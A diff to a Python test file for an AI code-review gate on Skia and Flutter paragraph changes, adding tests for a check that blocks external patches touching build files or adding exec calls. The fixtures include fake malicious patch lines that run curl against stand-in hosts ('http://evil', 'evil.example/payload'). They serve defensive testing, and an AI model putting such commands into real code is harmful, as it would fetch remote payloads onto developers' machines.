@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import base64
 import pathlib
 import sys
 from unittest import mock
@@ -276,7 +277,7 @@ class AuditGateTests(unittest.TestCase):
         self.assertEqual(dec_auth["tier"], -1)
         self.assertEqual(dec_auth["audit_state"], "blocked_auth")
 
-        # Tier 2: real code change -> read-only deep audit on tier="pro", manual-only guardrails
+        # Tier 2: real code change -> deep audit on tier="pro" with auto-corpus after CLEAN/NITS
         dec_t2 = audit_gate.decide_audit_action(
             item={
                 **base_item,
@@ -303,7 +304,8 @@ class AuditGateTests(unittest.TestCase):
         self.assertEqual(dec_t2["model_tier"], "pro")
         self.assertIn("save-review", dec_t2["prompt"])
         self.assertIn("-Wshorten-64-to-32", dec_t2["prompt"])
-        self.assertIn("run_webparagraph_corpus.py", dec_t2["prompt"])
+        self.assertIn("run_flutter_paragraph_tests.py", dec_t2["prompt"])
+        self.assertNotIn("НЕ запускай автоматическую сборку", dec_t2["prompt"])
         self.assertIn("НЕ заливай companion %wip CL", dec_t2["prompt"])
         self.assertIn("gerrit_draft.py save", dec_t2["prompt"])
         self.assertIn("НИКОГДА не публикуй `/review`", dec_t2["prompt"])
@@ -325,6 +327,164 @@ class AuditGateTests(unittest.TestCase):
         )
         self.assertEqual(dec_unaudited_rebase["tier"], 2)
         self.assertEqual(dec_unaudited_rebase["delta_kind"], "initial")
+
+    def test_auto_corpus_and_external_rce_gate_in_build_audit_prompt(self):
+        # Internal Googler SkParagraph CL on Cloudtop runs both Flutter corpus and google3 A/B
+        goog_prompt = audit_gate.build_audit_prompt(
+            tier=2,
+            item={
+                "item_key": "gerrit:1400176",
+                "kind": "gerrit",
+                "target_id": "1400176",
+                "url": "https://skia-review.googlesource.com/c/skia/+/1400176",
+                "subject": "[skparagraph] Fix line metrics",
+                "patchset": 3,
+                "revision": "abcdef123456",
+                "is_external": False,
+                "role": "reviewer (goog)",
+                "files": [
+                    "modules/skparagraph/src/ParagraphImpl.cpp",
+                    "modules/skparagraph/BUILD.bazel",
+                ],
+            },
+            prev_triage=None,
+            delta_info={"delta_kind": "initial"},
+            has_citc=True,
+        )
+        self.assertIn("run_flutter_paragraph_tests.py", goog_prompt)
+        self.assertIn("run_g3_paragraph_tests.py", goog_prompt)
+        self.assertIn("cand=cl:1400176/3", goog_prompt)
+        self.assertIn("--g3-compare-md", goog_prompt)
+        self.assertNotIn("RCE-гейт заблокировал", goog_prompt)
+
+        # External WebParagraph PR with pure .dart source files passes path check and checks diff
+        ext_safe = audit_gate.check_external_corpus_safety(
+            ["engine/src/flutter/lib/web_ui/lib/src/engine/text_fragmenter.dart"],
+            is_external=True,
+        )
+        self.assertTrue(ext_safe["safe"])
+        ext_wp_prompt = audit_gate.build_audit_prompt(
+            tier=2,
+            item={
+                "item_key": "github:195366",
+                "kind": "github",
+                "target_id": "195366",
+                "url": "https://github.com/flutter/flutter/pull/195366",
+                "subject": "[web_paragraph] Render soft hyphens",
+                "patchset": 1,
+                "head_sha": "c3d96d675db3",
+                "is_external": True,
+                "files": ["engine/src/flutter/lib/web_ui/lib/src/engine/text_fragmenter.dart"],
+            },
+            prev_triage=None,
+            delta_info={"delta_kind": "initial"},
+            has_citc=True,
+        )
+        self.assertIn("run_webparagraph_corpus.py", ext_wp_prompt)
+        self.assertIn("Process.run", ext_wp_prompt)
+
+        # External PR touching build/script files or adding exec primitives is blocked by RCE gate
+        bad_path = audit_gate.check_external_corpus_safety(
+            ["modules/skparagraph/src/ParagraphImpl.cpp", "BUILD.gn"],
+            is_external=True,
+        )
+        self.assertFalse(bad_path["safe"])
+        self.assertIn("BUILD.gn", bad_path["reason"])
+
+        bad_diff = audit_gate.check_external_corpus_safety(
+            ["engine/src/flutter/lib/web_ui/lib/src/engine/layout.dart"],
+            is_external=True,
+            patch_text="+++ b/layout.dart\n+  await Process.run('curl', ['http://evil']);\n",
+        )
+        self.assertFalse(bad_diff["safe"])
+
+        blocked_prompt = audit_gate.build_audit_prompt(
+            tier=2,
+            item={
+                "item_key": "gerrit:1499999",
+                "kind": "gerrit",
+                "target_id": "1499999",
+                "url": "https://skia-review.googlesource.com/c/skia/+/1499999",
+                "subject": "External build tweak",
+                "patchset": 1,
+                "revision": "deadbeef1234",
+                "is_external": True,
+                "role": "reviewer (ext)",
+                "files": ["modules/skparagraph/src/ParagraphImpl.cpp", "DEPS"],
+            },
+            prev_triage=None,
+            delta_info={"delta_kind": "initial"},
+            has_citc=True,
+        )
+        self.assertIn("RCE-гейт заблокировал", blocked_prompt)
+        self.assertIn("--corpus pending", blocked_prompt)
+
+        # Dual-corpus files keep both runners in gate_cmds without duplicate --compare-md flags
+        dual_prompt = audit_gate.build_audit_prompt(
+            tier=2,
+            item={
+                "item_key": "gerrit:1400555",
+                "kind": "gerrit",
+                "target_id": "1400555",
+                "url": "https://skia-review.googlesource.com/c/skia/+/1400555",
+                "subject": "Sync paragraph changes",
+                "patchset": 2,
+                "revision": "123456abcdef",
+                "is_external": False,
+                "files": [
+                    "modules/skparagraph/src/ParagraphImpl.cpp",
+                    "engine/src/flutter/lib/web_ui/lib/src/engine/text_fragmenter.dart",
+                ],
+            },
+            prev_triage=None,
+            delta_info={"delta_kind": "initial"},
+            has_citc=False,
+        )
+        self.assertIn("run_flutter_paragraph_tests.py", dual_prompt)
+        self.assertIn("run_webparagraph_corpus.py", dual_prompt)
+        self.assertIn("--compare-md /tmp/flutter_cl_1400555_ps2/compare.md", dual_prompt)
+        self.assertNotIn("--compare-md /tmp/wp_pr_1400555_ps2/compare.md", dual_prompt)
+
+    def test_decide_audit_action_fetches_external_patch_for_rce_gate(self):
+        # decide_audit_action fetches external patch text so diff-level RCE blocks unsafe calls
+        b64_evil_patch = base64.b64encode(
+            b"--- a/modules/skparagraph/src/ParagraphImpl.cpp\n"
+            b"+++ b/modules/skparagraph/src/ParagraphImpl.cpp\n"
+            b"+  system(\"curl https://evil.example/payload\");\n"
+        )
+        fake_resp = mock.MagicMock()
+        fake_resp.read.return_value = b64_evil_patch
+        fake_resp.__enter__.return_value = fake_resp
+        with mock.patch("urllib.request.urlopen", return_value=fake_resp):
+            dec_ext_rce = audit_gate.decide_audit_action(
+                item={
+                    "item_key": "gerrit:1499998",
+                    "kind": "gerrit",
+                    "host": "skia-review.googlesource.com",
+                    "target_id": "1499998",
+                    "url": "https://skia-review.googlesource.com/c/skia/+/1499998",
+                    "subject": "[skparagraph] Innocuous looking title",
+                    "patchset": 1,
+                    "revision": "feedface1234",
+                    "is_external": True,
+                    "role": "reviewer (ext)",
+                    "files": ["modules/skparagraph/src/ParagraphImpl.cpp"],
+                },
+                prev_triage=None,
+                delta_info={
+                    "delta_kind": "initial",
+                    "is_code_change": True,
+                    "upstream_module_overlap": False,
+                    "upstream_commits": [],
+                },
+                has_new_external_msg=False,
+                msg_snippet="",
+                open_external_threads=0,
+                preflight={"ok": True, "reason": ""},
+            )
+        self.assertEqual(dec_ext_rce["tier"], 2)
+        self.assertIn("RCE-гейт заблокировал", dec_ext_rce["prompt"])
+        self.assertIn("--corpus pending", dec_ext_rce["prompt"])
 
     def test_check_audit_preflight_passes_check_ssh_false(self):
         ok_proc = mock.Mock(returncode=0)
